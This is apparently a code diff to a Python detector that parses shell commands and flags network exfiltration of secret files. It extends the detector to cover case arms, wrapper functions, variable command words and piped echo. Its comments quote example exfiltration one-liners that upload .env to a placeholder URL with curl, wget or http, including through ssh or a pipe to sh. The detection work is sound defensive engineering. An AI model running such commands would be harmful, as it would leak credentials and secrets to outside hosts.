@@ -1376,6 +1376,76 @@ def _function_header_end(command: list[str], idx: int) -> int | None:
     return None
 
 
+def _case_pattern_end(command: list[str], idx: int) -> int | None:
+    """Return the index after a ``case`` arm pattern at ``idx``, or ``None``.
+
+    ``x)``, ``*)``, ``"$1")``, ``(x)``, ``( x)`` and ``x )`` each end a
+    pattern; the arm's first command follows.
+    """
+    word = command[idx]
+    if word == "(" and idx + 1 < len(command) and command[idx + 1].endswith(")"):
+        return idx + 2
+    if word.endswith(")") and word != ")" and not word.endswith("()"):
+        return idx + 1
+    if word != "(" and idx + 1 < len(command) and command[idx + 1] == ")":
+        return idx + 2
+    return None
+
+
+def _command_prefix_end(command: list[str], idx: int, in_case: bool) -> tuple[int, int, list[str]]:
+    """Skip the compound syntax in front of a command word.
+
+    Returns the index of the command word, the number of ``case`` commands
+    opened, and the names of the functions defined. Skipped are the keywords
+    and leaders ``if``, ``while``, ``until``, ``then``, ``do``, ``else``,
+    ``!``, ``{`` and ``(``, a ``(`` glued to the command word as in ``(ssh
+    host curl URL)``, ``coproc`` and its optional name, function headers,
+    ``case WORD in``, and, inside a ``case`` (``in_case``) or right after its
+    ``in``, an arm pattern such as ``x)``. ``for`` and ``select`` take a word
+    list, not a command, so they stay the command word. ``command`` is
+    changed in place when a glued ``(`` is split off.
+    """
+    cases = 0
+    names: list[str] = []
+    pattern_allowed = in_case
+    while idx < len(command):
+        word = command[idx]
+        if pattern_allowed:
+            pattern_allowed = False
+            pattern_end = _case_pattern_end(command, idx)
+            if pattern_end is not None:
+                idx = pattern_end
+                continue
+        if word == "case":
+            cases += 1
+            idx += 2
+            if idx < len(command) and command[idx] == "in":
+                idx += 1
+                pattern_allowed = True
+            continue
+        if word in _COMMAND_POSITION_LEADERS or (word in _COMPOUND_OPENERS and word not in ("for", "select")):
+            idx += 1
+            continue
+        if word == "coproc":
+            idx += 1
+            if idx + 1 < len(command) and _SHELL_NAME_RE.fullmatch(command[idx]) and command[idx + 1] in ("{", "("):
+                idx += 1
+            continue
+        if len(word) > 1 and word.startswith("(") and not word.startswith("(("):
+            command[idx : idx + 1] = ["(", word[1:]]
+            continue
+        header = _function_header_end(command, idx)
+        if header is not None:
+            if word == "function":
+                names.append(command[idx + 1].removesuffix("()"))
+            else:
+                names.append(word.removesuffix("()"))
+            idx = header
+            continue
+        break
+    return idx, cases, names
+
+
 def _compound_keywords(command: list[str]) -> tuple[int, int]:
     """Count the compound commands a simple command opens and closes.
 
@@ -1425,6 +1495,7 @@ def _compound_reads_input(tokens: list[str]) -> bool:
     piped = False
     defines_function = False
     has_input = False
+    case_depth = 0
     idx = 0
     while idx < len(tokens):
         if tokens[idx] in _SHELL_SEPARATORS:
@@ -1443,12 +1514,13 @@ def _compound_reads_input(tokens: list[str]) -> bool:
         if closes and redirects_input:
             return True
         has_input = has_input or redirects_input
-        lead = 0
-        while lead < len(command) and (
-            command[lead] in _COMPOUND_OPENERS or command[lead] in _COMMAND_POSITION_LEADERS
-        ):
-            lead += 1
-        defines_function = defines_function or (lead < len(command) and _function_header_end(command, lead) is not None)
+        if command[0] == "esac":
+            case_depth = max(case_depth - 1, 0)
+        # A function may be defined after compound keywords or in a case arm,
+        # as in "case x in x) f() { http URL; }".
+        _, cases, names = _command_prefix_end(command, 0, case_depth > 0)
+        case_depth += cases
+        defines_function = defines_function or bool(names)
         idx = end
     return defines_function and has_input
 
@@ -1538,6 +1610,12 @@ def _network_tokens_exfiltrate(tokens: list[str], _depth: int) -> bool:
     # command inside it, as in "while read -r l; do http URL; done < .env".
     compound_input = _compound_reads_input(tokens)
     compound_depth = 0
+    case_depth = 0
+    # Functions whose body is still open, with the compound depth before each
+    # header, and the clients and runners each function's body starts, so
+    # "up() { curl "$@"; }; up -d @.env URL" is checked as curl.
+    open_functions: list[tuple[str, int]] = []
+    function_commands: dict[str, set[str]] = {}
 
     while idx < len(tokens):
         if tokens[idx] in _SHELL_SEPARATORS:
@@ -1554,10 +1632,20 @@ def _network_tokens_exfiltrate(tokens: list[str], _depth: int) -> bool:
         opens, closes = _compound_keywords(command)
         # "g() ( http URL )" opens and closes its body in one command.
         inside_compound = compound_depth + opens > 0
+        depth_before = compound_depth
         compound_depth = max(compound_depth + opens - closes, 0)
         command_stdin = stdin_piped or (compound_input and inside_compound)
 
-        cmd_idx = 0
+        # The command word follows any compound keywords, leaders, function
+        # headers, case patterns or coproc, as in "do ssh host curl URL",
+        # "{ ssh host curl URL; }", "f() { curl "$@"" or "x) < .env http URL".
+        if command[0] == "esac":
+            case_depth = max(case_depth - 1, 0)
+        cmd_idx, cases, defined = _command_prefix_end(command, 0, case_depth > 0)
+        case_depth += cases
+        open_functions = [entry for entry in open_functions if entry[1] < depth_before]
+        open_functions.extend((name, depth_before) for name in defined)
+
         for _ in range(_MAX_SHELL_WRAPPERS + 1):
             while cmd_idx < len(command):
                 # A redirection before the command word, as in "< .env http
@@ -1595,6 +1683,23 @@ def _network_tokens_exfiltrate(tokens: list[str], _depth: int) -> bool:
         # checks; it never skips the command as a printer or declaration, and
         # never drops its stdin as a text consumer.
         dynamic = "$" in command[cmd_idx] or "`" in command[cmd_idx]
+
+        # A function whose body starts a client or runner, as in "up() { curl
+        # "$@"; }", passes each call's arguments on, so "up -d @.env URL" is
+        # checked with curl's upload rules and "r host curl URL" after "r() {
+        # ssh "$@"; }" with the runner rule.
+        function_starts = function_commands.get(executable, set())
+        if open_functions:
+            started = function_starts | (
+                {executable} if executable in _NETWORK_EXECUTABLES or executable in _NETWORK_COMMAND_RUNNERS else set()
+            )
+            for name, _ in open_functions:
+                function_commands.setdefault(name, set()).update(started)
+        for started_client in function_starts:
+            if started_client in _NETWORK_EXECUTABLES and _network_client_uploads(
+                started_client, command[cmd_idx + 1 :], command_stdin
+            ):
+                return True
 
         if executable in _SHELL_COMMAND_INTERPRETERS:
             c_payload = _shell_c_payload(command, cmd_idx, assignments)
@@ -1637,8 +1742,22 @@ def _network_tokens_exfiltrate(tokens: list[str], _depth: int) -> bool:
                 return True
             if not dynamic:
                 continue
+        elif "$" in executable or "`" in executable:
+            # A "$VAR" or backtick command word with no recorded value, as in
+            # "for c in curl wget; do $c --post-file=.env URL; done", may be
+            # any client. When it is given a URL that is not the value of a
+            # separate option word, its arguments get the curl and wget upload
+            # rules; "$GREP -F https://x src/" is given none.
+            rest = command[cmd_idx + 1 :]
+            if any(
+                "://" in word and (position == 0 or not rest[position - 1].startswith("-") or "=" in rest[position - 1])
+                for position, word in enumerate(rest)
+            ) and any(_network_client_uploads(name, rest, command_stdin) for name in ("curl", "wget")):
+                return True
 
-        if executable in _INERT_PRINT_COMMANDS and not dynamic:
+        # A printer whose output is piped on, as in "echo curl -d @.env URL |
+        # sh", may be feeding its words to a shell, so they are checked below.
+        if executable in _INERT_PRINT_COMMANDS and not dynamic and not (idx < len(tokens) and tokens[idx] == "|"):
             continue
 
         # Other commands may run a later word as a command, as find -exec and
@@ -1691,7 +1810,7 @@ def _network_tokens_exfiltrate(tokens: list[str], _depth: int) -> bool:
             or "`" in reader
             or _network_executable(reader, assignments, word_names) not in _STDIN_TEXT_CONSUMERS
         )
-        runs_elsewhere = executable in _NETWORK_COMMAND_RUNNERS
+        runs_elsewhere = executable in _NETWORK_COMMAND_RUNNERS or bool(function_starts & _NETWORK_COMMAND_RUNNERS)
         seen_clients: set[str] = set()
         for sub_idx in range(cmd_idx + 1, len(command)):
             client = _network_executable(command[sub_idx], assignments, word_names)
